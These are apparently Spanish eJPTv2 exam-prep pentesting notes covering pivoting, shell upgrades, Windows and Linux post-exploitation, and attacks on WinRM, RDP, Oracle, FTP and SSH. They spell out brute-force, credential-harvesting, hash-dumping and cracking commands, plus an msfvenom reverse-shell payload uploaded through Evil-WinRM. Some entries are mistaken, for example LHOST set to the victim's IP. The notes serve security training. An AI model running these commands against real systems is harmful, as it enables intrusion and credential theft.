Una vez configurado el enrutamiento, realizamos un escaneo de puertos para identificar los servicios expuestos por la máquina víctima final:

\`\`\`powershell
use scanner/portscan/tcp
show options                # Ver opciones necesarias.
set RHOSTS <ip_víctima_final>
run
\`\`\`

***

## Configuración de Port Forwarding

Ahora, configuramos el **port forwarding** para redirigir tráfico desde la máquina víctima final hacia nuestro equipo atacante:

\`\`\`powershell
use post/windows/manage/portproxy
show options                # Ver opciones necesarias.
set CONNECT_ADDRESS <ip_víctima>   # IP de la máquina víctima final.
set CONNECT_PORT <puerto_víctima>  # Puerto de la víctima a atacar.
set LOCAL_ADDRESS 0.0.0.0          # Siempre usar 0.0.0.0.
set LOCAL_PORT <puerto_local>       # Puerto local donde recibir el tráfico.
set SESSION <session_id>            # Obtenido con sessions -l.
run
\`\`\`

***

## Acceso al puerto redirigido

Por último, accedemos al puerto redirigido desde nuestro navegador utilizando la IP de la máquina intermedia y el puerto configurado:

\`\`\`powershell
<ip_máquina_intermedia>:<puerto_local>   # Ejemplo: 10.10.10.9:5000
\`\`\`

Con esto, habremos establecido un túnel para acceder a los servicios internos de la red comprometida, superando las restricciones impuestas por _firewalls_ y segmentaciones.

***

<mark style="background-color:yellow;"> Recordar ir tomando notas de absolutamente todos los datos que encontremos.</mark>

***
`,ii=`Para crearnos una pseudo-consola donde podamos hacer _control c_ y no tengamos problemas con el teclado ejecutamos lo siguiente:

\`\`\`bash
script /dev/null -c bash # Una vez tengamos acceso a la máquina escribimos esto.
control z # Lo dejamos en segundo plano.
stty raw -echo; fg 
xterm
export TERM=xterm
export SHELL=bash
\`\`\`

***

### A continuación vamos a ver varios métodos para lanzarnos una TTY

\`\`\`bash
python -c 'import pty;pty.spawn("/bin/bash")' # Python TTY Shell.
python3 -c 'import pty;pty.spawn("/bin/bash")' # Python TTY Shell.
/bin/sh -i # Spawn Interactive sh shell.
perl -e 'exec "/bin/sh";' # **Spawn Perl TTY Shell.
ruby -e 'exec "/bin/sh"' # Spawn Ruby TTY Shell.
\`\`\`
`,ai=`## WINDOWS POST EXPLOTACIÓN&#x20;

La post-explotación es una fase crítica en las pruebas de penetración que ocurre después de obtener acceso inicial a un sistema. Esta etapa es fundamental para comprender el alcance real de una vulnerabilidad y evaluar el impacto potencial en la seguridad del sistema.

### La fase de post-explotación se centra en tres objetivos principales:

* Recolección de información del sistema comprometido.
* Escalada de privilegios.
* Movimiento lateral en la red.

### Técnicas de Reconocimiento del Sistema

### Información del sistema

\`\`\`powershell
systeminfo  # Información general del sistema
wmic os get Caption, Version, BuildNumber  # Versión del sistema operativo
hostname  # Nombre del host
dir C:\\Users  # Usuarios en el sistema
\`\`\`

### Información del usuario

\`\`\`powershell
whoami  # Usuario actual
whoami /priv  # Privilegios del usuario actual
net user  # Usuarios del sistema
net localgroup Administrators  # Usuarios con privilegios de administrador
\`\`\`

### Si encontramos usuarios con privilegios, podemos intentar elevar privilegios usando exploits conocidos.

### Explotación del Kernel

\`\`\`powershell
systeminfo | findstr /B /C:"OS Version"  # Verificar versión del sistema operativo
wmic qfe get HotFixID  # Listar parches instalados
\`\`\`

Consultar la siguiente web para exploits conocidos: [https://www.exploit-db.com/](https://www.exploit-db.com/)

### Búsqueda de Credenciales

\`\`\`powershell
findstr /si password *.txt *.ini *.config  # Buscar contraseñas en archivos de configuración
reg query HKLM /f password /t REG_SZ /s  # Buscar credenciales en el registro
\`\`\`

### Análisis de Historial

\`\`\`powershell
type C:\\Users\\<usuario>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt  # Historial de comandos de PowerShell
type C:\\Users\\<usuario>\\ntuser.dat.LOG1  # Registro de actividad del usuario
\`\`\`

### Buscar Claves SSH

\`\`\`powershell
dir /s /b C:\\Users\\*.ssh\\id_rsa  # Buscar claves privadas SSH
dir /s /b C:\\Users\\*.ssh\\authorized_keys  # Claves autorizadas
\`\`\`

### Configuraciones SUID/SGID (Equivalente a Windows: Archivos con permisos elevados)

\`\`\`powershell
icacls C:\\Windows\\System32  # Ver permisos de archivos del sistema
icacls C:\\Users\\<usuario> /grant Everyone:F  # Modificar permisos (requiere privilegios elevados)
\`\`\`

### Tareas Programadas

\`\`\`powershell
schtasks /query /fo LIST /v  # Listar tareas programadas
dir C:\\Windows\\Tasks  # Ver tareas programadas manualmente
dir C:\\Windows\\System32\\Tasks  # Tareas programadas por el sistema
\`\`\`

### Servicios y Configuraciones Sensibles

\`\`\`powershell
wmic service list brief  # Listar servicios en ejecución
net start  # Ver servicios iniciados
Get-WmiObject Win32_Service | Select-Object Name, StartName  # Ver servicios con cuentas privilegiadas
\`\`\`

### Configuración de Red y Conexiones

\`\`\`powershell
ipconfig /all  # Configuración de red
netstat -ano  # Conexiones activas y procesos asociados
arp -a  # Tabla ARP
route print  # Tabla de enrutamiento
\`\`\`

### Archivos y Directorios Sensibles

\`\`\`powershell
dir /s /b C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Recent  # Archivos recientes
dir /s /b C:\\Users\\*\\Documents\\  # Documentos del usuario
dir /s /b C:\\Users\\*\\Desktop\\  # Escritorio de los usuarios
dir /s /b C:\\Windows\\System32\\config  # Archivos de configuración
\`\`\`

### Archivos de Configuración de Tareas Programadas

\`\`\`powershell
dir /s /b C:\\Windows\\System32\\Tasks  # Listar tareas programadas
dir /s /b C:\\Windows\\Tasks  # Listar tareas ocultas
\`\`\`

<figure><img src="/pentesting/assets/dalle-2025-02-17-10-40-59-a-hacker-wearing-a-dark-hoodie-and-a-mask-sitting-in-front-of-multiple-computer-screens-filled-with-code-and-security-warnings-the-hacker-is-holding.webp" alt="" width="563"><figcaption></figcaption></figure>
`,oi=`## Windows Remote Management

**Índice**

1. Introducción a WinRM
2. Reconocimiento inicial
3. Verificación del servicio
4. Explotación
5. Post-explotación
6. Herramientas útiles
7. Medidas de protección

### 1. Introducción a WinRM

Windows Remote Management (WinRM) es un servicio de administración remota que utiliza el protocolo WS-Management. Opera por defecto en los puertos 5985 (HTTP) y 5986 (HTTPS).

### 2. Reconocimiento inicial

#### Escaneo de puertos

\`\`\`bash
nmap -p5985,5986 -sV <ip_victima>
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <ip_victima>
\`\`\`

#### Verificación del servicio WinRM

\`\`\`bash
crackmapexec winrm <ip_victima> -u administrator -p <password_wordlists.txt> # wordlists recomendado: usr/share/metasploit-framework/data/wordlists/unix_paswords.txt

crackmapexec winrm <ip_victima> -u <username> -p <password> -x "<comando_a_ejecutar>" # Cuando tengamos unas credenciales válidas
\`\`\`

### 3. Verificación del servicio

Herramientas principales para verificar la accesibilidad del servicio WinRM:

* **Evil-WinRM:** Herramienta especializada para conexiones WinRM
* **CrackMapExec:** Para verificar credenciales y acceso
* **Impacket-WmiExec:** Para ejecutar comandos remotos

### 4. Explotación

### Usando Evil-WinRM

\`\`\`bash
# Conexión básica
evil-winrm -i <ip_victima> -u<username> -p <password>

# Conexión con hash NT
evil-winrm -i <ip_victima> -u<username> -H <NT-hash>

# Conexión SSL
evil-winrm -i <ip_victima> -u<username> -p <password> -S
\`\`\`

### Usando CrackMapExec

\`\`\`bash
# Prueba de credenciales
crackmapexec winrm <ip_victima> -u <username> -p <password>

# Password spraying
crackmapexec winrm <ip_victima> -u <username_wordlists> -p <password_wordlists.txt>
\`\`\`

### 5. Post-explotación

Una vez dentro del sistema, algunas acciones comunes:

* Enumeración de usuarios y grupos locales
* Búsqueda de archivos sensibles
* Elevación de privilegios
* Movimiento lateral

### Comandos útiles en sesión Evil-WinRM

\`\`\`powershell
# Enumeración básica
whoami /all
net user
systeminfo

# Carga de archivos
upload local_file.exe C:\\\\Windows\\\\Temp\\\\
download C:\\\\sensitive_file.txt

# Ejecución de scripts PowerShell
Invoke-PowerShellScript.ps1
\`\`\`

#### Obtener una sesión Meterpreter a través de WinRM

Para obtener una sesión Meterpreter usando WinRM, podemos seguir estos pasos:

#### 1. Configuración del payload

\`\`\`bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip_victima> LPORT=4444 -f exe -o <nombre_salida.exe>
\`\`\`

#### 2. Configurar el handler en Metasploit

\`\`\`bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <ip_victima>
set LPORT 4444
run
\`\`\`

#### 3. Subir y ejecutar el payload usando Evil-WinRM

\`\`\`bash
# Conectar a WinRM
evil-winrm -i <ip_victima> -u <username> -p <password>

# En la sesión de Evil-WinRM
upload reverse.exe C:\\\\\\\\Windows\\\\\\\\Temp\\\\\\\\reverse.exe
start C:\\\\\\\\Windows\\\\\\\\Temp\\\\\\\\reverse.exe
\`\`\`

#### 4. Comandos útiles en la sesión Meterpreter

\`\`\`bash
getuid                    # Identificar usuario actual
sysinfo                   # Información del sistema
shell                     # Obtener shell cmd
load powershell          # Cargar extensión PowerShell
ps                       # Listar procesos
migrate <PID>            # Migrar a otro proceso
\`\`\`

Este método combina WinRM para el acceso inicial y Meterpreter para post-explotación más avanzada, proporcionando mayor flexibilidad en las operaciones posteriores.
`,si=`Esta fase se centra en elevar los privilegios de una cuenta de usuario con acceso limitado a un nivel superior (como \`root\` en Linux o \`SYSTEM\` en Windows). Es un paso crítico para obtener el control total sobre el sistema comprometido.

---

## Metodologías por Sistema Operativo

He dividido los recursos de escalada según el entorno objetivo para facilitar la consulta rápida:

| Sistema | Descripción Técnica | Documentación |
| :--- | :--- | :--- |
|  **Linux** | Explotación de SUID, Kernel, tareas Cron y archivos de configuración. | [Ver Notas](/pentesting/privilege-escalation/linux) |
|  **Windows** | Análisis de permisos de servicios, DLL Hijacking y vulnerabilidades de Kernel. | [Ver Notas](/pentesting/privilege-escalation/windows) |

---

## Objetivos del Privilege Escalation

* **Enumeración Local:** Identificar configuraciones erróneas y parches de seguridad faltantes.
* **Elevación Vertical:** Pasar de un usuario estándar a un administrador o superusuario.
* **Elevación Horizontal:** Acceder a otras cuentas de usuario con el mismo nivel de privilegios pero con información diferente.
* **Explotación de Vectores:** Uso de herramientas de automatización y scripts manuales para detectar debilidades.

---

## Comunidad y Contenido
Puedes seguir mi progreso y contenido adicional en:

* **YouTube**  [bitsofalber](https://www.youtube.com/@bitsofalber)
* **Instagram**  [@bitsofalber](https://www.instagram.com/bitsofalber/)
* **LinkedIn**  [ahidalgotech](https://linkedin.com/in/ahidalgotech)

---
`,ci=`## ![](</pentesting/assets/dalle-2025-02-22-09-03-38-a-high-tech-cybersecurity-themed-image-focused-on-privilege-escalation-in-linux-the-image-features-a-hacker-in-a-dark-environment-wearing-a-hoodie.webp>)

## Información del Sistema

\`\`\`bash
uname -a # Información detallada del kernel y sistema operativo.
cat /etc/issue / cat /etc/*-release # Versión de la distribución.
hostname # Nombre del host.
echo $PATH # Ver como está el path.
env # Variable del entorno.
lscpu # Descubrir información adicional del sistema.
\`\`\`

## Información de Usuario y Grupos

\`\`\`bash
whoami # Identificar usuario actual
ls -la /home/ # Directorios de usuarios.
grep "*sh$" /etc/passwd # Ver que usuarios tienen shells de inicio de sesión.
id # id de usuarios y grupos
cat /etc/passwd | grep /bin/bash # Lista usuarios del sistema y filtramos por los que tengan una bash
cat /etc/group # Listar grupos.
history # Muestra el historial de comandos
\`\`\`

## Información de Red

\`\`\`bash
ifconfig / ip a # Muestra interfaces de red.
netstat -antup # Conexiones activas y puertos abiertos.
route / ip route # Tabla de enrutamiento.
cat /etc/resolv.conf # Configuración DNS.
arp -a # Tabla ARP.
\`\`\`

## Archivos y Directorios Sensibles

<pre class="language-bash"><code class="lang-bash">ls -l ~/.ssh # Lista el contenido del servicio SSH.
ls -l /tmp /var/tmp /dev/shm # Buscar archivos temporales.
find / -perm -4000 2>/dev/null # Buscar archivos con binarios SUID.
find / -user root -perm -4000 -exec ls -ldb {} \\; 2>/dev/null # Buscar archivos con binarios SUID.
find / -perm -2000 2>/dev/null # Archivos SGID.
find / -type f \\( -name *_hist -o -name *_history \\) -exec ls -l {} \\; 2>/dev/null # Búsqueda de archivos de historial
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null # Buscar archivos grabables.
find / type -f -name "*.conf" 2>/dev/null # Archivos de configuración.
find / -type d -name ".*" -ls 2>/dev/null # Buscar directorios ocultos.
find / -type f -name ".*" -exec ls -l {} \\; 2>/dev/null | grep &#x3C;username> # Buscar archivos ocultos.
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null # Directorios escribibles.
find / -writable -type d 2>/dev/null # Directorios escribibles.
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\\|snap\\|share" # Buscar binarios .sh
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list # Enumeración de servicios y componentes internos de Linux
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done # Comprobar en GTFOBINS
cat wp-config.php | grep 'DB_USER\\|DB_PASSWORD' # credenciales de la base de datos MySQL dentro de los archivos de configuración de WordPress
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null # .config en proc y mail,
<strong>sudo -l # Busca binarios que podamos utilizar como el usuario con máximos privilegios (root).
</strong></code></pre>

## Procesos y Servicios

\`\`\`bash
ps au # Procesos en ejecución.
ps aux | grep root # Ver que procesos está ejecutando root.
top # Procesos en tiempo real.
service --status-all # Estado de servicios.
systemctl list-units # Unidades sustemd activas.
\`\`\`

## Tareas Programadas

\`\`\`bash
ctrontab -l # Tareas cron del usuario actual.
ls -la /etc/cron.daily/
ls -la /etc/cron* # Archivos cron del sistema.
cat /etc/crontab  # Configuración cron del sistema.
\`\`\`

## Logs y Auditoría

\`\`\`bash
cat /var/log/auth.log # Logs de autenticación.
cat /var/log/syslog # Logs del sistema.
last # Últimos inicios de sesión.
\`\`\`

## Información de Seguridad

\`\`\`bash
cat /etc/shadow # Hashes de contraseñas (requiere root)
iptables -L # Reglas de firewall.
cat /etc/ssh/sshd_config # Configuración SSH
\`\`\`

## Material adicional:

[https://gtfobins.github.io](https://gtfobins.github.io/) -> Con esta web podemos buscar tanto loos binarios SUID y los archivos que podamos ejecutar como el usuario con máximos privilegios al utilizar \`sudo -l.\`
`,li=`## ![](</pentesting/assets/dalle-2025-02-22-09-58-13-a-high-tech-cybersecurity-themed-image-focused-on-privilege-escalation-in-windows-the-image-features-a-hacker-in-a-dark-environment-wearing-a-hoodie.webp>)

## Enumeración del Sistema

\`\`\`bash
systeminfo # Información detallada del sistema operativo y parches instalados.
wmic os get Caption, Version, BuildNumber # Versión del sistema operativo.
hostname # Nombre del host.
env # Variables de entorno.
\`\`\`

## Información de Usuario y Grupos

\`\`\`bash
whoami # Identificar usuario actual.
whoami /priv # Privilegios del usuario actual.
whoami /groups # Grupos a los que pertenece el usuario.
net user # Lista de usuarios del sistema.
net localgroup Administradores # Usuarios con privilegios de administrador.
dir C:\\Users # Directorios de usuarios.
history # Historial de comandos en PowerShell.
\`\`\`

## Información de Red

\`\`\`bash
ipconfig /all # Muestra interfaces de red y configuración IP.
netstat -ano # Conexiones activas y puertos abiertos.
route print # Tabla de enrutamiento.
type C:\\Windows\\System32\\drivers\\etc\\hosts # Configuración DNS.
arp -a # Tabla ARP.
sc query # ver los servicios existentes del sistema.
\`\`\`

## Buscar archivos.

\`\`\`bash
find /s file # para buscar en el sistema con X nombre (user.txt | passwords.xml | *.txt).
findstr /si password *.<extensión> # .txt,xml,ini,etc.
dir /s /b /a "C:\\Users\\*pass*.txt" "C:\\Users\\*pass*.xml" "C:\\Users\\*pass*.ini"
\`\`\`

## bash**Exploit Suggester** con Metasploit.

Una vez hayamos comprometido la máquina haremos lo siguiente:

\`\`\`bash
msfconsole -q # Abrimos Metasploit en modo silencioso.
search local_exploit_suggeste # Busca el exploit.
use 0 # Seleccionamos el exploit, Este módulo analizará el sistema y proporcionará una lista de exploits recomendados basados en vulnerabilidades conocidas.
options # Vemos las opciones.
set SESSION 1 # Comprobamos nuestra sesión con sessions -l
run
\`\`\`

Una vez que lancemos el exploit, nos saldrá una lista de posibles escalada de privilegios y tenemos que ir comprobando cual se ajusta a nuestras necesidades y nos funciona.

<figure><img src="/pentesting/assets/prviesc.png" alt=""><figcaption></figcaption></figure>
`,ui=`## 3389 - RDP

 RDP El puerto 3389 es utilizado por el servicio _Remote Desktop Protocol (RDP)_, un protocolo de acceso remoto común en entornos empresariales y administrativos. Debido a su uso extendido, es un objetivo frecuente de ataques y auditorías de seguridad.

 Resumen de Herramientas y Técnicas para Auditoría en RDP Esta guía cubre las principales herramientas y técnicas para auditar RDP en el puerto 3389 en el examen eJPTv2.

### Herramientas Principales:

* Nmap + Scripts NSE: Enumeración y detección de vulnerabilidades.
* Metasploit: Explotación de fallos y acceso no autorizado.
* Hydra: Ataques de fuerza bruta para credenciales.
* Rdesktop, XFreeRDP, Evil-WinRM: Acceso remoto y gestión de sesiones.

### Reconocimiento e Identificación del Servicio RDP Determinar la versión del servicio RDP es clave para detectar posibles vulnerabilidades.

\`\`\`bash
nmap -p 3389 -sCV <ip_victima> # Escaneo para intentar ver la versión.
nmap -p 3389 --script rdp-enum-encryption <ip_victima> # Identificación de cifrado RDP.
nmap -p 3389 --script rdp-vuln-ms12-020 <ip_victima> # Detección de vulnerabilidad MS12-020.
nmap -p 3389 --script rdp-ntlm-info <ip_victima> # Extracción de información NTLM.
nmap -p 3389 --script rdp-brute <ip_victima> # Ataque de fuerza bruta a RDP.
\`\`\`

### Uso de Metasploit para Auditoría de RDP Enumeración de configuración y detección de vulnerabilidades.

\`\`\`bash
msfconsole -q
use auxiliary/scanner/rdp/rdp_scanner # Escaneo de servicio RDP
set RHOSTS <ip_victima>
run
\`\`\`

 Ataque de autenticación débil con Metasploit.

\`\`\`bash
use auxiliary/scanner/rdp/rdp_login
set RHOSTS <ip_victima>
set USER_FILE /ruta_diccionario_usuarios.txt
set PASS_FILE /ruta_diccionario_claves.txt
set THREADS 10
exploit
\`\`\`

### Fuerza Bruta al Servicio RDP Hydra

\`\`\`bash
hydra -t 4 -V -f -L <wordlists_usenames.txt> -P <wordlists_password.txt> rdp://<ip_victima>
\`\`\`

### Acceso Remoto y Gestión de Sesiones

 Rdesktop

\`\`\`
rdesktop -u <usuario> -p <contraseña> <ip_victima>
\`\`\`

 XFreeRDP

\`\`\`
xfreerdp /v:<ip_victima> /u:<usuario> /p:<contraseña>
\`\`\`

 Evil-WinRM (para sesiones PowerShell remotas)

\`\`\`
evil-winrm -i <ip_victima> -u <usuario> -p <contraseña>
\`\`\`
`,di=`> **Enumeración y explotación por servicio.** Metodología técnica organizada por protocolo: reconocimiento, identificación de versiones, ataques de autenticación y explotación de cada servicio expuesto.

---

## Metodología por servicio

Tras el escaneo inicial de puertos, cada servicio abierto define un vector de ataque concreto. Estas notas recogen, para cada protocolo, el flujo completo de trabajo:

* **Reconocimiento:** identificación de versión y configuración con \`Nmap\` y scripts específicos.
* **Enumeración:** usuarios, recursos compartidos y superficie expuesta.
* **Ataques de autenticación:** fuerza bruta y credenciales por defecto.
* **Explotación:** vulnerabilidades conocidas y acceso al sistema.

---

## Servicios y puertos

| Servicio | Puerto | Documentación |
| :--- | :---: | :--- |
| **FTP** | 21 | [Transferencia de archivos](/pentesting/services/puerto-21-ftp) |
| **SSH** | 22 | [Acceso remoto y brute-force](/pentesting/services/puerto-22-ssh) |
| **SMTP** | 25 | [Enumeración de usuarios](/pentesting/services/puerto-25-smtp) |
| **HTTP/HTTPS** | 80/443 | [Auditoría web](/pentesting/services/puerto-80-443-http-https) |
| **SMB / RPC** | 139/445 | [Recursos compartidos](/pentesting/services/puertos-139-445-smb) |
| **MySQL** | 3306 | [Bases de datos](/pentesting/services/puerto-3306-mysql) |
| **Oracle DB** | 1521 | [Servicios Oracle](/pentesting/services/puerto-1521-oracle-database) |
| **RDP** | 3389 | [Control remoto](/pentesting/services/3389-rdp) |
`,fi=`## 1521 - Oracle Database

Oracle Database El puerto 1521 es utilizado por el servicio Oracle Database, una de las bases de datos más utilizadas en entornos empresariales y críticos. Debido a su importancia, es un objetivo frecuente en auditorías de seguridad.

### Herramientas Principales:

 Nmap + Scripts NSE: Enumeración y detección de vulnerabilidades.  Metasploit: Explotación de fallos y acceso no autorizado.  Hydra & Medusa: Ataques de fuerza bruta para credenciales.

### Reconocimiento e Identificación del Servicio Oracle

\`\`\`bash
nmap -p 1521 -sCV <ip_victima> # Escaneo para intentar ver la versión. 
nmap -p 1521 --script oracle-enum-users <ip_victima> # Enumeración de usuarios. 
nmap -p 1521 --script oracle-brute <ip_victima> # Ataque de fuerza bruta. 
nmap -p 1521 --script oracle-sid-brute <ip_victima> # Descubrimiento del SID de la base de datos.
nmap -p 1521 --script oracle-tns-version <ip_victima> # Ver versión del servicio TNS.
\`\`\`

### Uso de Metasploit para Auditoría de Oracle

\`\`\`bash
msfconsole -q 
use auxiliary/admin/oracle/oracle_login # Enumeración de usuarios 
set RHOSTS <ip_victima> 
run
\`\`\`

### Ataque de autenticación débil.

\`\`\`bash
use auxiliary/scanner/oracle/oracle_login 
set RHOSTS <ip_victima> 
set USERNAME SYS
set PASSWORD password 
run
\`\`\`

### Lista recursos de Oracle Database.

\`\`\`bash
use auxiliary/admin/oracle/oracle_sid_brute # Descubrimiento de SID 
use auxiliary/admin/oracle/oracle_hashdump # Extracción de hashes de contraseñas 
use auxiliary/admin/oracle/oracle_sql # Ejecución de consultas SQL 
use auxiliary/admin/oracle/oracle_schema # Enumeración del esquema de la base de datos
\`\`\`

### Fuerza brutal al servicio Oracle Database

**Hydra**

\`\`\`bash
hydra -l -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <ip_victima> oracle
\`\`\`

**Metasploit**

\`\`\`bash
msfconsole -q use auxiliary/scanner/oracle/oracle_login # Ataque de Fuerza Bruta contra Oracle Database 
set RHOSTS <ip_victima> 
set USER_FILE /ruta_diccionario.txt 
set PASS_FILE /ruta_diccionario.txt 
set THREADS <número> # Definir número de intentos por segundo (Opcional, por defecto 5) exploit
\`\`\`

### Comandos para interactuar con Oracle Database

\`\`\`bash
sqlplus /<contraseña>@<ip_servidor>:1521/ # Iniciar sesión con credenciales válidas. 
sqlplus / as sysdba # Iniciar sesión como administrador. 
SELECT username FROM dba_users; # Enumerar usuarios de la base de datos. 
SELECT * FROM all_tables; # Mostrar todas las tablas en la base de datos. 
SELECT * FROM all_views; # Enumerar todas las vistas disponibles. 
SELECT * FROM all_indexes; # Enumerar todos los índices de la base de datos. 
SELECT password FROM sys.user$ WHERE name='' # Obtener hashes de contraseñas de los usuarios.
\`\`\`
`,pi=`##

## Puerto 21 - FTP (File Transfer Protocol)

El **puerto 21** es el puerto estándar utilizado por el protocolo **FTP** para la transferencia de archivos entre un cliente y un servidor. **FTP** puede operar en **modo activo** o **modo pasivo**, dependiendo de la configuración del servidor y las restricciones de red.

#### Reconocimiento del Puerto 21

Si encontramos el **puerto 21** abierto, debemos centrarnos en verificar si el acceso mediante el usuario **anonymous** está habilitado. Para ello, podemos utilizar los scripts de **Nmap**.

\`\`\`bash
ls -lah /usr/share/nmap/scripts | grep "ftp-*" # Buscar todos los scriptps que tiene nmap para FTP.
nmap -p21 -sCV <ip_objetivo> 
nmap --script=ftp-anon -p 21 <ip_objetivo> # Utilizar script específico.
nmap --script "ftp-*" -p 21 <ip_objetivo> # Utilizar todos los scripts relacionados con el serivicio ftp.
\`\`\`

<figure><img src="/pentesting/assets/captura-de-pantalla-2025-02-22-085859.png" alt=""><figcaption></figcaption></figure>

Si en el reporte se indica que el acceso mediante el usuario **anonymous** está habilitado, procederemos a conectarnos al servicio **FTP** con el siguiente comando:

\`\`\`bash
ftp <ip_obetivo> # Esperamos a que nos solicite las credenciales.
\`\`\`

Esperamos a que el servicio nos solicite las credenciales. Cuando se nos pida ingresar un usuario y una contraseña, debemos utilizar:

\`\`\`bash
username: anonymous
password: anonymous
\`\`\`

Si el inicio de sesión con el usuario **anonymous** no estuviera habilitado, podríamos utilizar la herramienta **Hydra** para realizar pruebas de acceso mediante la siguiente sintaxis:

\`\`\`bash
hydra -l <username> -P /usr/share/wordlists/rockyou.txt ftp # Podemos utilizar el diccionario de nuestra elección.
\`\`\`

Una vez que hayamos conseguido acceder al servicio **FTP**, independientemente del método utilizado, es fundamental conocer y utilizar una serie de comandos clave para interactuar con el sistema y verificar qué opciones están disponibles.

\`\`\`bash
ls - # Listar los directórios o archivos que hay disponibles. 
get <nombre_archivo> - # Descargar archivo nombrado.
put <nombre_archivo> - # Este comando debemos ver si lo tenemos disponible y nos servirá para subir archivos desde nuestra máquina atacante al servicio 21.
wget -m ftp://anonymous:anonymous@<ip> # Descargarmos todo el contenido del directório FTP.
\`\`\`

#### Explotación con Metasploit Framework en servidores FTP

**Metasploit Framework** proporciona varios módulos diseñados para explotar vulnerabilidades en servidores **FTP**. A continuación, algunos ejemplos prácticos:

\`\`\`bash
use auxiliary/scanner/ftp/ftp_version # Enumeración FTP
set RHOSTS <ip_target>/24 # ip de la máquina víctima.
set THREADS 50 
exploit 
 
use auxiliary/scanner/ftp/ftp_login # Fuerza bruta FTP.
set RHOSTS <ip_target> # ip de la máquina víctima.
set USER_FILE /path/to/users.txt # Seleccionamos diccionario de usuarios.
set PASS_FILE /path/to/passwords.txt # Seleccionamos diccionario de contraseñas.
set THREADS 10 
exploit
\`\`\`

> Siempre recomiendo probar distintos tipos de ataques, reconocimiento y exploración con varias herramientas. Así se aprende más y se pueden encontrar las mejores opciones para cada caso.

## Check List:

* [ ] Comprobar si está habilitado el login mediante el usuario anonymous.
* [ ] Comprobar versión del servicio FTP por si hubiera alguna vulnerabilidad.
* [ ] Comprobar si nos deja subir archivos al servicio con el comando \`put.\`

[https://www.youtube.com/watch?v=vHgWnL95HhQ](https://www.youtube.com/watch?v=vHgWnL95HhQ)
`,mi=`---
description: Como auditar el puerto 22 para el examen eJPTv2.
---

# Puerto 22 - SSH

**Uso de SSH para Conexiones Seguras y Administración Remota**

El protocolo **SSH (Secure Shell)** se emplea para establecer conexiones seguras con sistemas remotos, permitiendo tanto la administración de servidores como la transferencia segura de archivos.

#### Reconocimiento del Puerto 22 con Nmap

Para identificar los scripts disponibles en **Nmap** para el reconocimiento del puerto 22, podemos utilizar el siguiente _oneliner_:

\`\`\`bash
ls -lah /usr/share/nmap/scripts | grep "ssh-*" # Ver los scripts de nmap para el servicio ssh
\`\`\`

<figure><img src="/pentesting/assets/ssh.png" alt=""><figcaption></figcaption></figure>

A continuación, utilizaremos los scripts que mejor se adapten a nuestros objetivos. También existe la opción de ejecutar todos los scripts disponibles, aunque esto puede ralentizar significativamente el proceso de escaneo.

\`\`\`bash
nmap -p22 <ip_victima> -sCV # Script por defecto de nmap para ver servicio y versión.
nmap -p22 <ip_victima> --script ssh2-enum-algos # Recuperar algoritmos soportados 
nmap -p22 <ip_victima> --script ssh-hostkey --script-args ssh_hostkey=full # Recuperar keys debiles 
nmap -p22 <ip_victima> --script ssh-auth-methods --script-args="ssh.user=root" # Revisar metodos de autenticarnos
\`\`\`

**Realizar fuerza bruta al servicio SSH.**

> En entornos reales esto no suele surtir efecto ya que hay medidas para poder evitar este tipo de ataques, pero este examen está hecho para realizar este tipo de ataques (contra todo).

Para llevar a cabo un ataque de fuerza bruta contra el servicio **SSH**, utilizaremos dos herramientas distintas: **Metasploit** y **Hydra**.

**Fuerza Bruta al Servicio SSH con Metasploit**

\`\`\`bash
msfconsole -q # Abrimos metasploit en modo silencioso.
use auxiliary/scanner/ssh/ssh_login # Cargar el módulo de fuerza bruta SSH.
set RHOSTS <ip_victima>
set USERNAME <username> # Para probar un solo usuario.
set USER_FILE <ruta_diccionario_usernames.txt> # Para múltiples usuarios.
set PASS_FILE <ruta_diccionario_contraseñas.txt> # Ruta del diccionario.
set VERBOSE true # Para ver como se acontece el ataque en tiempo real.
set STOP_ON_SUCESS true # Se detiene cuando finaliza.
set KEY_PATH /ruta/a/clave_privada # Intentar acceso con claves privadas SSH.
set THREADS 5 # Definir número de intentos simultáneos (para evitar bloqueos).
exploit # Iniciar el ataque de fuerza bruta.

[+] Success: 'admin:admin123 - Logged in! 
# Mensaje que nos saldría si encontramos unas credenciales válidas.

\`\`\`

**Diccionarios mas utilizados para este examen:**

\`\`\`bash
/usr/share/wordlists/metasploit-framwork/common_passwords.txt
/usr/share/wordlists/metasploit-framwork/common_users.txt
/usr/share/wordlists/rockyou.txt

\`\`\`

**Realizar fuerza bruta al servicio SSH con Hydra.**

\`\`\`bash
hydra -l '<username>' -P <ruta_diccionario.txt> ssh://<ip_target> -t <cantidad_hilos> -F
# Con la flags -F le indicamos que detenga el ataque cuando encuentre una combinación válida.
\`\`\`

Una vez que hayamos obtenido credenciales válidas utilizando alguna de las herramientas mencionadas, podremos acceder al servicio **SSH** con el siguiente comando:

\`\`\`bash
ssh <username>@<ip> # Y proporcionamos el password
\`\`\`

**id\\_rsa**

#### ¿Qué hacer si encontramos un archivo \`id_rsa\`?

Si durante una auditoría de seguridad encontramos un archivo \`id_rsa\` en algún servicio, como **FTP** o dentro de un directorio tras un análisis de fuzzing web, es posible que no sea necesario conocer la contraseña de un usuario específico. En su lugar, podríamos acceder al servicio utilizando dicha **clave privada**.

#### Crackeo de Hash SSH con John The Ripper

\`\`\`bash
ssh2john id_rsa > id_rsa.hash # Convertimos la clave privada a hash.
john --wordlist=<ruta_diccionario> id_rsa.hash # Le indicamos el diccionario y el hash.
john --show id_rsa.hash # Ver la contraseña crackeada (si lo hemos conseguido)
\`\`\`

> Si la clave privada está protegida, John The Ripper mostrará la contraseña una vez la encuentre. Esta contraseña es necesaria para usar la clave privada al conectarse por SSH.

